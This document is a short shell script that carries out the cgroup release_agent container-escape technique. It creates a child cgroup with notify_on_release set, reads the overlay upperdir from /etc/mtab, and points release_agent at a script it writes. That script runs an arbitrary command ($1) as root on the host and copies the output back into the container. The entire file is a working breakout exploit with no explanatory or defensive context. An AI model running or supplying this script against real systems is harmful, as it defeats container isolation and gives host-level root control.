#!/bin/sh
dir=`dirname $(ls -x /sys/fs/cgroup/*/release_agent |head -n1)`
if [ $? -eq 1 ]; then
  echo "No cgroups with a release_agent found. Exiting."
  exit 1
fi
mkdir -p $dir/w
echo 1 > $dir/w/notify_on_release
mntpnt=`sed -n 's/.*\upperdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /out
echo $mntpnt/pwn.sh > $dir/release_agent
echo "#!/bin/sh
$1 > $mntpnt/out" >/pwn.sh
chmod +x /pwn.sh
sh -c "echo 0 > $dir/w/cgroup.procs"
sleep 1
cat /out
